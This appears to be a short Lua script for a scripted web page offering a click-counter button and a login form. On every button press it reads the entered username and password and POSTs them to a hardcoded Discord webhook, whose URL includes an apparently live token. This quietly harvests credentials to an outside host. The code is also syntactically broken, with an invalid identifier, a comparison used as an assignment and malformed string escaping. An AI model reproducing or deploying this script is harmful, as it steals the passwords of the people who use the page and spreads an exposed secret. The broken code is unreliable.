local button = get("button1")
local result = get("result")
local press = 1

local user_name = get("user_n")
local user_pass = get("user_p")
local log_bool = "false"
local button-login = get("button_login")

local discord_webhook_url = "https://discord.com/api/webhooks/1249752568188371085/lOGDGvGYhKpN_uJZWwHXAcg1Bp0FewWNZ5Bnwq05UnbYlZnNxe6ITccLSfIUE_xfy4iI"

button_login.on_click(function()
  if log_bool == "false" then
    log_bool == "true"
  end
end)

button.on_click(function()
  result.set_content(press)

  -- Send data to Discord Webhook
  local body = "{ \"content\": \.. user_name .. ": " .. user_pass .. ": " .. press .. "\" }"
  local res = fetch({
      url = discord_webhook_url,
      method = "POST",
      headers = { ["Content-Type"] = "application/json" },
      body = body,
  })

  if res and res.status == 204 then
      print("Message sent to Discord successfully.")
  else
      print("Failed to send message to Discord. Status: " .. (res and res.status or "unknown"))
  end

  press = press + 1
end)
